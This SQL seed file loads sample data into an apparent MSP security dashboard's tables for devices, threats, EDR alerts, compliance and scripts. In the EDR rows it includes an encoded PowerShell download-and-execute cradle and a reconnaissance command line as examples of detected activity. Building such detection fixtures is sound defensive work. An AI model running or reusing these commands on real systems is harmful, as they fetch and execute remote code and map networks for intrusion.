-- Populate RMM Devices with sample data
INSERT INTO public.rmm_devices (
  hostname, ip_address, device_type, os_info, status, last_seen, cpu_usage, memory_usage, disk_usage, last_logged_user, customer_id, user_id
) VALUES 
  ('SRV-DC-01', '192.168.1.10', 'server', 'Windows Server 2022', 'online', now() - interval '5 minutes', 15, 45, 30, 'Administrator', null, auth.uid()),
  ('SRV-FILE-01', '192.168.1.11', 'server', 'Windows Server 2019', 'online', now() - interval '2 minutes', 8, 60, 75, 'SYSTEM', null, auth.uid()),
  ('SRV-SQL-01', '192.168.1.12', 'server', 'Windows Server 2022', 'online', now() - interval '1 minute', 25, 80, 55, 'sa', null, auth.uid()),
  ('WS-ADMIN-01', '192.168.1.100', 'workstation', 'Windows 11 Pro', 'online', now() - interval '10 minutes', 12, 35, 40, 'john.doe', null, auth.uid()),
  ('WS-SALES-01', '192.168.1.101', 'workstation', 'Windows 10 Pro', 'online', now() - interval '15 minutes', 20, 50, 65, 'jane.smith', null, auth.uid()),
  ('WS-DEV-01', '192.168.1.102', 'workstation', 'Windows 11 Pro', 'online', now() - interval '30 minutes', 45, 70, 80, 'mike.wilson', null, auth.uid()),
  ('LT-MOBILE-01', '192.168.1.150', 'laptop', 'Windows 11 Home', 'offline', now() - interval '2 hours', 0, 0, 0, 'sarah.johnson', null, auth.uid()),
  ('SRV-BACKUP-01', '192.168.1.20', 'server', 'Ubuntu Server 22.04', 'online', now() - interval '3 minutes', 5, 25, 90, 'root', null, auth.uid());

-- Populate Security Events with sample data
INSERT INTO public.security_events (
  user_id, source_app, event_type, severity, status, title, description, affected_assets, user_email, ip_address, threat_indicators, raw_data
) VALUES 
  (auth.uid(), 'safedoc', 'malware_detected', 'critical', 'open', 'Malware Detected in PDF Document', 'Trojan.PDF.Suspicious found in quarterly_report.pdf', ARRAY['WS-ADMIN-01'], 'john.doe@company.com', '192.168.1.100', ARRAY['hash:a1b2c3d4e5f6'], '{"scan_engine": "ClamAV", "file_size": 2048576}'::jsonb),
  (auth.uid(), 'safemail', 'phishing_attempt', 'high', 'investigating', 'Phishing Email Blocked', 'Suspicious email with malicious link detected', ARRAY['mail-server'], 'jane.smith@company.com', '203.0.113.45', ARRAY['url:malicious-site.com'], '{"sender": "fake@bank.com", "subject": "Urgent Account Verification"}'::jsonb),
  (auth.uid(), 'safelink', 'suspicious_url', 'medium', 'resolved', 'Suspicious URL Accessed', 'Employee attempted to access known malicious website', ARRAY['WS-SALES-01'], 'jane.smith@company.com', '192.168.1.101', ARRAY['url:bad-site.net'], '{"blocked": true, "category": "malware"}'::jsonb),
  (auth.uid(), 'safepass', 'weak_password', 'low', 'open', 'Weak Password Detected', 'User account has weak password that should be updated', ARRAY['AD-Controller'], 'mike.wilson@company.com', '192.168.1.102', ARRAY['user:mike.wilson'], '{"password_strength": 2, "last_changed": "2023-01-15"}'::jsonb),
  (auth.uid(), 'safenet', 'unusual_traffic', 'medium', 'open', 'Unusual Network Traffic', 'Abnormal data transfer detected from workstation', ARRAY['WS-DEV-01'], null, '192.168.1.102', ARRAY['traffic:anomaly'], '{"bytes_transferred": 10485760, "destination": "external"}'::jsonb);

-- Populate MSP Clients with sample data  
INSERT INTO public.msp_clients (
  msp_id, client_name, contact_email, contact_phone, billing_address, status, monthly_revenue, device_count, created_at
) VALUES 
  ((SELECT id FROM public.msps WHERE user_id = auth.uid() LIMIT 1), 'TechCorp Solutions', 'admin@techcorp.com', '+1-555-0123', '123 Business Ave, Tech City, TC 12345', 'active', 2500.00, 25, now() - interval '6 months'),
  ((SELECT id FROM public.msps WHERE user_id = auth.uid() LIMIT 1), 'Healthcare Partners', 'it@healthpartners.com', '+1-555-0456', '456 Medical Drive, Health City, HC 67890', 'active', 4200.00, 40, now() - interval '4 months'),
  ((SELECT id FROM public.msps WHERE user_id = auth.uid() LIMIT 1), 'Legal Associates', 'tech@legalassoc.com', '+1-555-0789', '789 Law Street, Legal Town, LT 13579', 'active', 1800.00, 15, now() - interval '8 months'),
  ((SELECT id FROM public.msps WHERE user_id = auth.uid() LIMIT 1), 'Retail Group', 'support@retailgroup.com', '+1-555-0321', '321 Store Plaza, Retail City, RC 24680', 'active', 3500.00, 35, now() - interval '3 months');

-- Insert MSP if it doesn't exist
INSERT INTO public.msps (user_id, company_name, contact_email, phone, address, subscription_tier)
SELECT auth.uid(), 'Demo MSP Company', 'demo@msp.com', '+1-555-0000', '100 MSP Street, Demo City, DC 00000', 'premium'
WHERE NOT EXISTS (SELECT 1 FROM public.msps WHERE user_id = auth.uid());

-- Populate Antivirus Scans with sample data
INSERT INTO public.antivirus_scans (
  client_id, hostname, scan_type, files_scanned, threats_found, threats_quarantined, scan_duration, started_at, completed_at, scan_results
) VALUES 
  ((SELECT id FROM public.msp_clients LIMIT 1), 'WS-ADMIN-01', 'full_system', 125000, 2, 2, 3600, now() - interval '2 hours', now() - interval '1 hour', '{"engine": "Windows Defender", "threats": ["Trojan.Win32.Test", "Adware.Generic"]}'::jsonb),
  ((SELECT id FROM public.msp_clients LIMIT 1), 'SRV-FILE-01', 'quick_scan', 25000, 0, 0, 600, now() - interval '30 minutes', now() - interval '20 minutes', '{"engine": "Windows Defender", "clean": true}'::jsonb),
  ((SELECT id FROM public.msp_clients LIMIT 1), 'WS-SALES-01', 'scheduled', 80000, 1, 1, 2400, now() - interval '4 hours', now() - interval '3 hours 20 minutes', '{"engine": "Windows Defender", "threats": ["PUP.Optional.Browser"]}'::jsonb);

-- Populate Threat Intelligence with sample data
INSERT INTO public.threat_intelligence (
  user_id, indicator_type, indicator_value, reputation, score, threats, sources, last_analyzed, confidence, is_active
) VALUES 
  (auth.uid(), 'ip', '203.0.113.45', 'malicious', 95, '{"malware": ["Botnet C2"], "phishing": true}'::jsonb, '["VirusTotal", "AbuseIPDB"]'::jsonb, now() - interval '1 hour', 90, true),
  (auth.uid(), 'domain', 'malicious-site.com', 'suspicious', 75, '{"categories": ["malware", "phishing"]}'::jsonb, '["OpenPhish", "PhishTank"]'::jsonb, now() - interval '2 hours', 85, true),
  (auth.uid(), 'hash', 'a1b2c3d4e5f6789012345678901234567890abcd', 'malicious', 98, '{"family": "Trojan.PDF", "behavior": ["file_encryption"]}'::jsonb, '["VirusTotal", "Hybrid Analysis"]'::jsonb, now() - interval '30 minutes', 95, true),
  (auth.uid(), 'url', 'https://bad-site.net/login', 'suspicious', 65, '{"categories": ["credential_theft"]}'::jsonb, '["URLVoid", "Sucuri"]'::jsonb, now() - interval '3 hours', 70, true);

-- Populate Document Scans with sample data
INSERT INTO public.document_scans (
  user_id, file_name, file_hash, file_size, scan_status, threat_level, threats_detected, completed_at, scan_result
) VALUES 
  (auth.uid(), 'quarterly_report.pdf', 'a1b2c3d4e5f6789012345678901234567890abcd', 2048576, 'completed', 'high', 1, now() - interval '1 hour', '{"engine": "ClamAV", "threats": ["Trojan.PDF.Suspicious"], "action": "quarantined"}'::jsonb),
  (auth.uid(), 'invoice_template.docx', 'f1e2d3c4b5a6987654321098765432109876fedc', 1024000, 'completed', 'clean', 0, now() - interval '30 minutes', '{"engine": "ClamAV", "clean": true}'::jsonb),
  (auth.uid(), 'presentation.pptx', '123456789abcdef0123456789abcdef0123456789', 5120000, 'completed', 'low', 0, now() - interval '2 hours', '{"engine": "ClamAV", "warnings": ["macro_detected"], "clean": true}'::jsonb);

-- Populate Email Scans with sample data
INSERT INTO public.email_scans (
  user_id, sender_email, recipient_email, email_subject, scan_status, threat_level, threats_detected, completed_at, scan_result
) VALUES 
  (auth.uid(), 'fake@bank.com', 'jane.smith@company.com', 'Urgent Account Verification Required', 'completed', 'high', 2, now() - interval '2 hours', '{"phishing_score": 95, "threats": ["phishing", "credential_theft"], "blocked": true}'::jsonb),
  (auth.uid(), 'newsletter@vendor.com', 'team@company.com', 'Monthly Tech Update', 'completed', 'clean', 0, now() - interval '1 hour', '{"clean": true, "reputation": "good"}'::jsonb),
  (auth.uid(), 'support@suspicious.net', 'admin@company.com', 'System Alert - Action Required', 'completed', 'medium', 1, now() - interval '45 minutes', '{"suspicious_links": 1, "action": "quarantined"}'::jsonb);

-- Populate EDR Behavioral Analysis with sample data
INSERT INTO public.edr_behavioral_analysis (
  user_id, endpoint_id, process_name, process_id, command_line, file_path, hash_sha256, behavior_score, threat_classification, anomaly_indicators, mitre_tactics, mitre_techniques, detection_rules_triggered, status
) VALUES 
  (auth.uid(), null, 'powershell.exe', 1234, 'powershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAALwBzAGMAcgBpAHAAdAAuAHAAcwAxACcAKQA=', 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', 'abc123def456789012345678901234567890abcdef1234567890123456789012', 85, 'suspicious', '["encoded_command", "web_download", "fileless_execution"]'::jsonb, ARRAY['execution', 'command_and_control'], ARRAY['T1059.001', 'T1105'], '["Suspicious PowerShell", "Encoded Command"]'::jsonb, 'monitoring'),
  (auth.uid(), null, 'svchost.exe', 5678, 'C:\\Windows\\System32\\svchost.exe -k NetworkService -p', 'C:\\Windows\\System32\\svchost.exe', 'def456abc789012345678901234567890abcdef12345678901234567890123', 15, 'benign', '[]'::jsonb, ARRAY[], ARRAY[], '[]'::jsonb, 'monitoring'),
  (auth.uid(), null, 'cmd.exe', 9012, 'cmd.exe /c whoami & net user & ipconfig', 'C:\\Windows\\System32\\cmd.exe', '789012345abc678901234567890def123456789012345678abcdef90123456', 70, 'reconnaissance', '["system_discovery", "network_discovery"]'::jsonb, ARRAY['discovery'], ARRAY['T1033', 'T1016'], '["System Discovery Commands"]'::jsonb, 'monitoring');

-- Populate EDR Real-time Alerts with sample data
INSERT INTO public.edr_realtime_alerts (
  user_id, endpoint_id, behavioral_analysis_id, alert_type, severity, status, title, description, indicators_of_compromise, containment_status
) VALUES 
  (auth.uid(), null, (SELECT id FROM public.edr_behavioral_analysis WHERE process_name = 'powershell.exe' LIMIT 1), 'malware_execution', 'high', 'new', 'Suspicious PowerShell Execution Detected', 'Encoded PowerShell command attempting to download and execute remote script', '["encoded_powershell", "remote_download", "process_injection"]'::jsonb, 'none'),
  (auth.uid(), null, (SELECT id FROM public.edr_behavioral_analysis WHERE process_name = 'cmd.exe' LIMIT 1), 'reconnaissance', 'medium', 'investigating', 'System Discovery Activity', 'Command line tools used for system and network reconnaissance', '["whoami_execution", "net_user_enum", "network_discovery"]'::jsonb, 'monitoring');

-- Populate Compliance Frameworks with sample data
INSERT INTO public.compliance_frameworks (
  framework_name, version, description, requirements, evidence_requirements, automated_checks
) VALUES 
  ('SOC 2 Type II', '2017', 'SOC 2 Type II compliance framework for service organizations', '{"CC1": "Control Environment", "CC2": "Communication and Information", "CC3": "Risk Assessment"}'::jsonb, '{"CC1.1": "board_minutes", "CC1.2": "policy_documents"}'::jsonb, '{"access_reviews": "monthly", "log_monitoring": "continuous"}'::jsonb),
  ('ISO 27001', '2022', 'International standard for information security management systems', '{"A.5": "Information Security Policies", "A.6": "Organization of Information Security"}'::jsonb, '{"A.5.1": "security_policy", "A.6.1": "org_chart"}'::jsonb, '{"vulnerability_scans": "weekly", "access_audits": "quarterly"}'::jsonb),
  ('HIPAA', '2023', 'Health Insurance Portability and Accountability Act compliance', '{"164.308": "Administrative Safeguards", "164.310": "Physical Safeguards"}'::jsonb, '{"164.308.1": "security_officer_designation", "164.310.1": "facility_controls"}'::jsonb, '{"audit_logs": "daily", "encryption_check": "continuous"}'::jsonb)
ON CONFLICT (framework_name) DO NOTHING;

-- Populate Alert Rules with sample data
INSERT INTO public.alert_rules (
  user_id, name, description, conditions, severity_threshold, notification_channels, is_active
) VALUES 
  (auth.uid(), 'Critical Security Events', 'Alert on any critical severity security events', '{"severity": "critical", "source_apps": ["safedoc", "safemail", "safelink"]}'::jsonb, 'critical', '{"email": ["admin@company.com"], "slack": ["#security-alerts"]}'::jsonb, true),
  (auth.uid(), 'Multiple Failed Logins', 'Alert on multiple failed login attempts', '{"event_type": "failed_login", "count": 5, "timeframe": "5m"}'::jsonb, 'high', '{"email": ["security@company.com"]}'::jsonb, true),
  (auth.uid(), 'Malware Detections', 'Alert on any malware detection across all systems', '{"threat_indicators": "malware", "affected_assets": "*"}'::jsonb, 'high', '{"email": ["admin@company.com"], "sms": ["+1-555-0123"]}'::jsonb, true),
  (auth.uid(), 'Unusual Network Traffic', 'Alert on abnormal network traffic patterns', '{"event_type": "unusual_traffic", "threshold": "10GB"}'::jsonb, 'medium', '{"email": ["netadmin@company.com"]}'::jsonb, true);

-- Create sample remote sessions
INSERT INTO public.remote_sessions (
  user_id, device_id, session_type, status, client_ip, session_token, connection_details
) VALUES 
  (auth.uid(), (SELECT id FROM public.rmm_devices WHERE hostname = 'WS-ADMIN-01' LIMIT 1), 'desktop', 'active', '192.168.1.50', 'session_' || gen_random_uuid()::text, '{"resolution": "1920x1080", "color_depth": 32}'::jsonb),
  (auth.uid(), (SELECT id FROM public.rmm_devices WHERE hostname = 'SRV-FILE-01' LIMIT 1), 'terminal', 'ended', '192.168.1.51', 'session_' || gen_random_uuid()::text, '{"shell": "powershell"}'::jsonb);

-- Sample script executions
INSERT INTO public.script_executions (
  user_id, device_id, script_name, script_content, script_type, execution_status, output, exit_code, started_at, completed_at
) VALUES 
  (auth.uid(), (SELECT id FROM public.rmm_devices WHERE hostname = 'WS-ADMIN-01' LIMIT 1), 'System Info Check', 'Get-ComputerInfo | Select-Object WindowsProductName, TotalPhysicalMemory, CsProcessors', 'powershell', 'completed', 'WindowsProductName: Windows 11 Pro\nTotalPhysicalMemory: 17179869184\nCsProcessors: Intel(R) Core(TM) i7-10700K CPU @ 3.80GHz', 0, now() - interval '30 minutes', now() - interval '29 minutes'),
  (auth.uid(), (SELECT id FROM public.rmm_devices WHERE hostname = 'SRV-FILE-01' LIMIT 1), 'Disk Space Check', 'Get-WmiObject -Class Win32_LogicalDisk | Select-Object DeviceID, Size, FreeSpace', 'powershell', 'completed', 'DeviceID: C:\nSize: 536870912000\nFreeSpace: 134217728000', 0, now() - interval '1 hour', now() - interval '59 minutes');